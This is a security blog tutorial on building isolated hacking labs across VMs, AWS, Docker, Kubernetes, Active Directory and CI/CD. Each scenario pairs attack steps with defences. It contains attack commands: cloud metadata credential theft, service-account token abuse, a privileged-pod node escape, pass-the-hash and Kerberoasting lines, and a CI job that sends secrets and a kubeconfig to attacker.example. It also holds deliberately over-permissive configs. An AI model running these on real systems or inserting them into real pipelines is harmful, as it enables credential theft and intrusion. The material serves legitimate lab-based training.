---
title:  "Building a Home Lab to Learn Hacking (Without Going to Jail)"
subtitle: "From old laptops to cloud, Docker, and Kubernetes – with real scenarios to practise on"
author: "Geeky Blinder"
avatar: "img/authors/geeky.jpg"
image: "img/cards/building-a-home-lab-to-learn-hacking-without-going-to-j.jpg"
date: 2026-07-19
tags: homelab hacking pentest redteam blueteam docker kubernetes cloud
---

## Ground Rules: Learn Like an Attacker, Act Like a Defender

If you want to get good at hacking (and defending), you need somewhere you can break things freely. That means a lab you own, control, and can reset when you accidentally `rm -rf /` in the wrong shell.

Before anything else:

- **Only attack systems you own or have explicit permission to test.** TryHackMe, HackTheBox, PortSwigger Academy, OffSec proving grounds, and bug-bounty programs (within scope) are the only legal "external" targets. Everything else is a felony in most jurisdictions, regardless of how educational your intent was.
- **Isolate your lab.** Separate VLAN/Wi‑Fi or internal-only cloud VPC. No internet-exposed vulnerable boxes unless you have a specific reason and the firewalling to back it up.
- **Make it resettable.** VM snapshots, container images, IaC (Terraform, manifests). When something goes wrong (and it will), you should be 60 seconds from a clean slate.

Companion reading: this lab is where you practise the things in [How To Write a CTF Writeup That's Actually Worth Reading](https://geekyblinder.co.uk/#/2026/02/01/How-To-Write-a-CTF-Writeup), [Auth, OAuth, and JWTs: How They Work and How Attackers Break Them](https://geekyblinder.co.uk/#/2026/06/07/Auth-OAuth-and-JWTs-How-They-Work-and-How-Attackers-Break-Th), and [Modern Web Hacking in 2026: Beyond Just Run SQLMap](https://geekyblinder.co.uk/#/2027/03/14/Modern-Web-Hacking-in-2026-Beyond-Just-Run-SQLMap).

---

## Option 1: Home Lab with Laptops and Old PCs

The classic starting point.

### 1.1 Topology

- **Attacker box.** Laptop or PC running Kali, Parrot, or your own Linux build with security tools.
- **Victim VMs.** Vulnerable Linux/Windows running DVWA, Juice Shop, Metasploitable 3, VulnHub images.
- **Network.** A virtual internal network (VirtualBox / VMware / Hyper‑V "internal" mode), or a separate physical switch with no uplink to your real LAN.

### 1.2 Tools on the Attacker Box

```bash
# minimum useful baseline (Kali / Debian / Ubuntu)
sudo apt install -y \
  nmap masscan \
  ffuf gobuster dirb \
  sqlmap \
  hydra \
  john hashcat \
  metasploit-framework \
  burpsuite \
  python3-pip
pip3 install pwntools impacket
```

For Windows-side practice, also grab [BloodHound](https://github.com/SpecterOps/BloodHound), [Rubeus](https://github.com/GhostPack/Rubeus), and the [Impacket suite](https://github.com/fortra/impacket).

### 1.3 Scenario: Web App Recon → Exploit → Post-Ex

**Build it:**

- Spin up an Ubuntu VM with DVWA (or use the prebuilt [Metasploitable 2/3](https://github.com/rapid7/metasploitable3) image).
- Put it on the internal network only.

**Walkthrough:**

1. **Recon.** `nmap -sV -sC -p- <target>` to find services and versions. Visit the app, map login/upload/SQLi/command-exec endpoints.
2. **Attack-surface mapping.** Burp Suite or ZAP to crawl. Catalogue parameters (IDs, search, forms).
3. **Exploit.** Pick the SQLi module. Manual injection first (single-quote test, UNION SELECT) — *then* sqlmap to confirm. Extract DB schema, user table, password hashes. Crack a hash with `hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt`.
4. **Post-ex.** From command-exec or file upload → reverse shell to your Kali. Enumerate: `whoami`, OS, network, sudoers (`-l`), SUID binaries (`find / -perm -4000 2>/dev/null`), config files with creds. Try a privesc — kernel exploit, sudo misconfig, writable cron.
5. **Defence thinking.** What logs would have caught this? Auth log, web access log, WAF? Which control breaks the chain — input validation, parameterised queries, least-privileged DB user, egress filtering?

The defence-thinking step is the difference between "I solved a CTF" and "I understand the attack chain in production".

---

## Option 2: Cloud Lab — AWS, GCP, Azure

Modern attacks live in the cloud. Practise there.

### 2.1 Core Pattern

- Dedicated **lab account/project/subscription**, never your personal admin account.
- VPC with public subnet (bastion / Kali) and private subnet (vulnerable apps).
- Security groups / NSGs default-deny; allow inbound only from your IP, only to the bastion.
- Budget alarm at $20/month — easy to forget a `t3.large` running.

### 2.2 AWS Example: Web App + Cloud Misconfig

**Build it (Terraform sketch):**

```hcl
resource "aws_iam_role" "vuln_app_role" {
  name = "vuln-app-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
      Action = "sts:AssumeRole"
    }]
  })
}

# Deliberately over-permissive — for the lab
resource "aws_iam_role_policy_attachment" "lab_overprivileged" {
  role       = aws_iam_role.vuln_app_role.name
  policy_arn = "arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"
}

resource "aws_s3_bucket" "fake_sensitive" {
  bucket = "lab-sensitive-data-${random_id.suffix.hex}"
}
```

**Walkthrough:**

1. From `kali-ec2`, scan the private app: `nmap -sV <internal-ip>`. Find the web vuln (RCE / SSRF / file upload).
2. Once you have code execution on `web-vuln`, hit instance metadata. **Use IMDSv2 in your lab to learn the modern technique:**
   ```bash
   TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
   curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/vuln-app-role
   ```
3. Configure the AWS CLI with the temporary creds. `aws s3 ls` and `aws s3 cp s3://lab-sensitive-data-XXX/secret.txt .` to exfil the fake data.
4. **Defence angle.**
   - Lock IAM to least privilege.
   - Force IMDSv2-only on the instance.
   - Block egress at the network level so the app can't talk to arbitrary endpoints.
   - Detect: CloudTrail `AssumeRole` / `GetObject` from unusual sources, GuardDuty findings.

Repeat the pattern in GCP (service accounts + Cloud Storage) and Azure (managed identities + Blob Storage). The shape — exploit app → grab workload identity → use cloud APIs — is the same.

---

## Option 3: Docker-Only Lab on a Single Machine

Perfect when you don't want to juggle VMs.

### 3.1 Layout

```yaml
# docker-compose.yml
version: "3.8"

services:
  attacker:
    image: kalilinux/kali-rolling
    tty: true
    stdin_open: true
    networks: [labnet]
    volumes:
      - ./loot:/loot

  dvwa:
    image: vulnerables/web-dvwa
    networks: [labnet]

  juice:
    image: bkimminich/juice-shop
    networks: [labnet]
    ports: ["3000:3000"]   # only if you want browser access from host

  internal-api:
    image: vulnerable/secret-api:latest   # or your own
    networks: [labnet]
    expose: ["8080"]      # not bound to host — only reachable from labnet

networks:
  labnet:
    driver: bridge
    internal: true        # no internet access from this network
```

```bash
docker compose up -d
docker compose exec attacker bash
# inside attacker container, install missing tools
apt update && apt install -y nmap ffuf hydra
```

### 3.2 Scenario: Multi-Target Recon and Pivot

1. **Discover.** `nmap -sn 172.18.0.0/16` (or whatever the labnet subnet is) → get IPs of all running containers.
2. **Service ID.** `nmap -sV -p- <ip>` against each. Identify which is DVWA, which is Juice Shop, which is the internal-only API.
3. **Initial foothold.** Exploit Juice Shop's auth bypass or DVWA's command-exec module. Get a foothold as the container's running user.
4. **Pivot.** From the compromised container, can you reach `internal-api` (which is `internal: true` so isn't published to your host)? If yes, you've demonstrated the same pattern as cloud-internal pivot — exploit external-facing app, use it to reach internal services.
5. **Defender view.** If you've spun up an ELK/Wazuh side-stack on the same host (separate compose), look at the access logs while you attack. Note signatures you could detect on.

---

## Option 4: Kubernetes Lab — Attacking the Cluster Mindset

Most modern infra is K8s or smells like K8s. Practise there.

### 4.1 Base Setup

Local options:

- [`kind`](https://kind.sigs.k8s.io/) — Kubernetes-in-Docker. Lightest. `kind create cluster --name lab`.
- [`k3d`](https://k3d.io/) — k3s in Docker. Slightly fuller-featured.
- `minikube` — heavier but battery-included.

Cloud option: managed K8s (GKE Autopilot, EKS, AKS) in a lab-only project. Cleaner but ~$70/mo running 24/7.

Namespace shape:

- `attacker` — pod with toolset.
- `vuln-apps` — deliberately vulnerable services.
- `monitoring` — Falco / Sysdig / a Loki+Promtail stack for the defender view.

### 4.2 Scenario: App → Pod → K8s API Abuse

**Build it:**

```yaml
# vuln-rbac.yaml — deliberately over-permissive ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: vuln-sa
  namespace: vuln-apps
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: vuln-sa-edit
  namespace: vuln-apps
subjects:
  - kind: ServiceAccount
    name: vuln-sa
    namespace: vuln-apps
roleRef:
  kind: ClusterRole
  name: edit                    # way more than the app needs
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vuln-web
  namespace: vuln-apps
spec:
  replicas: 1
  selector:
    matchLabels: { app: vuln-web }
  template:
    metadata:
      labels: { app: vuln-web }
    spec:
      serviceAccountName: vuln-sa
      automountServiceAccountToken: true   # default, but explicit here
      containers:
        - name: app
          image: vulnerables/web-dvwa
          ports: [{ containerPort: 80 }]
```

No NetworkPolicy means full intra-cluster access by default.

**Walkthrough:**

1. **External.** Port-forward the vulnerable web app: `kubectl port-forward -n vuln-apps deploy/vuln-web 8080:80`. Map and exploit a vuln to get RCE in the pod.
2. **Inside the pod.** List env, files, and especially:
   ```bash
   ls /var/run/secrets/kubernetes.io/serviceaccount/
   cat /var/run/secrets/kubernetes.io/serviceaccount/token
   cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
   ```
3. **Talk to the API.** Either install `kubectl` quickly, or use `curl` directly:
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   curl -k -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces/vuln-apps/secrets
   ```
4. **Abuse RBAC.** With `edit` rights on the namespace, create a privileged pod that mounts the host filesystem:
   ```yaml
   apiVersion: v1
   kind: Pod
   metadata: { name: pwn, namespace: vuln-apps }
   spec:
     containers:
       - name: pwn
         image: alpine
         command: ["sleep", "3600"]
         securityContext: { privileged: true }
         volumeMounts: [{ name: host, mountPath: /host }]
     volumes: [{ name: host, hostPath: { path: / } }]
   ```
   `kubectl apply -f pwn.yaml` then `kubectl exec -it pwn -- chroot /host bash`. You're now running on the node.
5. **Defence.**
   - Default-deny NetworkPolicy + only-what's-needed allows.
   - ServiceAccount RBAC scoped to specific verbs/resources.
   - `automountServiceAccountToken: false` unless explicitly needed.
   - Pod Security Standards (`restricted` baseline) blocks privileged pods at admission.
   - Kyverno / OPA Gatekeeper for custom policy.

For the deeper version of locking this down, see [Deep Walkthrough: Hardening a Kubernetes Namespace for a Real Service](https://geekyblinder.co.uk/#/2026/09/27/Deep-Walkthrough-Hardening-a-Kubernetes-Namespace-for-a-Real).

---

## Option 5: Cloud + Containers Combined

Bring the cloud and K8s patterns together.

**Setup:** managed K8s cluster, vulnerable app that has access to cloud storage via mounted credentials or workload identity (IRSA on EKS, Workload Identity on GKE, AAD Workload Identity on AKS).

**Scenario: data exfiltration cloud-native**

1. Exploit app-layer flaws — IDOR or broken access control to read other users' API objects.
2. Get RCE in the pod.
3. Use the pod's workload identity to talk to cloud storage directly:
   ```bash
   # GKE Workload Identity example
   gcloud auth application-default print-access-token
   gsutil ls gs://customer-data-bucket/
   ```
4. Exfil dummy data; observe what shows up in cloud audit logs (CloudTrail / Cloud Audit Logs / Activity Log).
5. **Hardening.** App-level authz on every endpoint. IAM scoped to specific bucket prefixes. Egress restricted via VPC SC / private endpoint. DLP alerts on bulk reads.

---

## Bonus Scenario 1: Internal Windows Lab and Lateral Movement

Classic AD attack practice — get a foothold, move sideways, pop the domain — in a lab you control.

**Build it:**

- One Windows Server VM as DC (AD DS), with a couple of test domain users and groups.
- One or two Windows 10/11 client VMs joined to the domain, different users logged in.
- One Kali/Parrot attacker VM on the same isolated network.
- Tools: Impacket suite, BloodHound, Rubeus, CrackMapExec.

**Walkthrough:**

1. **Recon.** `nmap -sV --script smb-os-discovery,smb-enum-shares <target>`. Enumerate SMB, RPC, WinRM. `crackmapexec smb <target_range>` to fingerprint hosts.
2. **Initial foothold (lab only).** Plant local user creds on a workstation, or enable an easy weakness (weak local password, RDP open from attacker subnet). Don't simulate phishing on real people.
3. **BloodHound mapping.** From the foothold:
   ```bash
   sharphound.exe -c All
   # transfer the output to attacker, ingest into BloodHound
   ```
   Visualise paths. The "Shortest Path to Domain Admins" query is the gateway drug.
4. **Lateral movement (techniques to map, not blindly automate).**
   - Pass-the-hash: `crackmapexec smb <target> -u user -H <ntlm-hash>`
   - Kerberoasting: `GetUserSPNs.py domain/user:pass -dc-ip <ip> -request`
   - AS-REP roasting (for users with `DONT_REQ_PREAUTH`).
   - Token impersonation, DCSync (with appropriate rights).
5. **Defence.** Least privilege for domain users, no widespread local admin, LAPS for local admin password rotation, tier-0 separation, Sysmon + Windows event logs to a SIEM, alerts on suspicious Kerberos behaviour.

---

## Bonus Scenario 2: Blue-Team View With Wazuh / Suricata

Everything above is twice as useful if you can see your own attacks from the defender's seat.

**Build it:**

- Wazuh manager (or Security Onion VM).
- Suricata sensor on the same network as your victims.
- Filebeat / Winlogbeat / Wazuh agent on each victim VM.

**Walkthrough:**

1. **Wire up logging.** Send Linux auth logs and Windows Security logs to Wazuh. Send network traffic via Suricata.
2. **Re-run attacks.** Web attacks on DVWA, port scans, failed logins, privesc.
3. **Study the alerts.** Which Wazuh rules fire? Which Suricata signatures? What's invisible?
4. **Tune detections.** Write a custom Wazuh rule for a pattern you saw but the defaults missed. Rules live in `/var/ossec/etc/rules/local_rules.xml`:
   ```xml
   <group name="webattacks,">
     <rule id="100501" level="10">
       <if_sid>31104,31108,31151</if_sid>
       <regex type="pcre2">UNION\s+SELECT|sleep\(\d+\)</regex>
       <description>Possible SQL injection attempt against web app</description>
       <mitre><id>T1190</id></mitre>
     </rule>
   </group>
   ```
5. **Iterate.** False positives → tighten the regex. False negatives → broaden until it triggers, then narrow to acceptable noise.

---

## Bonus Scenario 3: "Micro-Bounty" Simulation in Cloud

A nice intermediate step between guided labs and real bug bounties.

**Build it:**

A small mini-SaaS in your cloud lab account: web app + API, auth, profiles, fake data, cloud DB, object storage. Plant three issues:

- One obvious web vuln (e.g. SQLi in search).
- One subtle auth/IDOR bug (predictable IDs + missing ownership check).
- One cloud misconfig (over-broad IAM, public bucket inside a "private" VPC).

**Walkthrough:**

1. **Play external researcher.** Read your own "docs" only. Map endpoints, auth flows. Look for IDORs, broken access control, role confusion. File "reports" with proof, severity, suggested fix.
2. **Play internal security engineer.** Triage the reports. Fix in code/IaC. Add regression tests. Document risk → impact → remediation.
3. **Outcome.** You can truthfully say you built an app, found and fixed your own vulnerabilities, integrated security into the SDLC. Real portfolio material.

---

## Bonus Scenario 4: CI/CD Pipeline Abuse

Modern attackers love CI/CD because it's where code, secrets, and deployment power all live together.

**Build it:**

- Self-hosted Gitea or GitLab.
- A CI runner (GitLab Runner, Jenkins, Drone).
- A pipeline that builds container images and deploys to your K8s lab.
- Deliberate misconfig: runner with `cluster-admin` access; secrets in plain pipeline variables; `.gitlab-ci.yml` not reviewed before execution.

**Walkthrough:**

1. **Normal flow.** Push, build, deploy. Confirm everything works.
2. **Abuse perspective.** As a "malicious contributor", propose a `.gitlab-ci.yml` change that exfiltrates secrets:
   ```yaml
   pwn-job:
     stage: build
     script:
       - env | curl --data-binary @- https://attacker.example/exfil
       - cat ~/.kube/config | base64 | curl --data-binary @- https://attacker.example/exfil
   ```
3. **Observe** how easy it is to:
   - Steal pipeline secrets.
   - Run arbitrary code in the CI context.
   - Reach the cluster via the runner's kubeconfig.
4. **Hardening.**
   - Lock runner permissions to minimum (per-job tokens, scoped service accounts).
   - Separate runners for untrusted code (forks, MR pipelines).
   - Move secrets to Vault / cloud secret manager, fetched per-job with short-lived tokens.
   - Require MR review before pipelines run on protected branches.
   - Sigstore-sign images and verify on deploy.

---

## Cross-Cutting Patterns to Drill (Everywhere)

Across all environments, design exercises around patterns rather than specific boxes. The patterns recur in every estate.

- **Recon and enumeration.** Hosts, ports, services, routes, endpoints. Tech stack: frameworks, versions, headers.
- **Web app attacks.** SQLi, XSS, IDOR, SSRF, command injection, weak auth/session handling. (See [Auth, OAuth, and JWTs](https://geekyblinder.co.uk/#/2026/06/07/Auth-OAuth-and-JWTs-How-They-Work-and-How-Attackers-Break-Th).)
- **Infrastructure misconfig.** Over-broad IAM, exposed admin consoles, default creds, IMDSv1, public storage.
- **Lateral movement.** Pivot via compromised host/container. Reused keys, tokens, passwords across boundaries.
- **Privilege escalation.** Local misconfig (sudoers, SUID, writable cron). Cloud/K8s RBAC abuse.
- **Data access and exfiltration.** Find where the crown jewels live; prove how an attacker reaches them from a foothold.

For each scenario, write yourself a brief: entry point, objectives, rules, success criteria. That's CTF authoring with a defender's eye.

---

## Turning Your Lab into a Career Asset

Don't just build and forget. Capture it.

- **Configs in Git.** Terraform, compose files, manifests. Every lab reproducible from a clone.
- **Notes in Obsidian** (see [Obsidian as a Second Brain for Security and DevOps](https://geekyblinder.co.uk/#/2027/02/28/Obsidian-as-a-Second-Brain-for-Security-and-DevOps)). Architecture diagrams, attack paths, defences you'd add in real life.
- **Public, redacted walkthroughs.** Focus on learning, not copy-paste exploits. Great talk material, blog material, portfolio content.

When you can explain how you designed your lab, what you simulated, how you'd detect and prevent it in production, you're not "someone who did some boxes" — you're someone who understands both sides of the fence.

---

## Where to Go Next

- Start small. One attacker VM + one vulnerable web app, all on internal network.
- Add containers. Add K8s. Add monitoring. Add CI/CD. Each new piece gets one attack path, one detection method, one hardening action.
- Read [Stop Teaching Security Like It's 1999](https://geekyblinder.co.uk/#/2026/08/30/Stop-Teaching-Security-Like-Its-1999) for the meta on training and reps.
- Pair with platforms like TryHackMe SOC Level 1, HTB Pro Labs, AppSecEngineer for guided depth — your homelab covers what they can't (your own stack, your own scenarios).

If you can sit down with someone and walk them through how your lab is built, how you attack a given scenario, and how you'd detect and prevent that in production, you're already operating at the level of a genuinely dangerous (in the good way) security engineer.

<img src="img/authors/geeky.jpg" width="40"/>
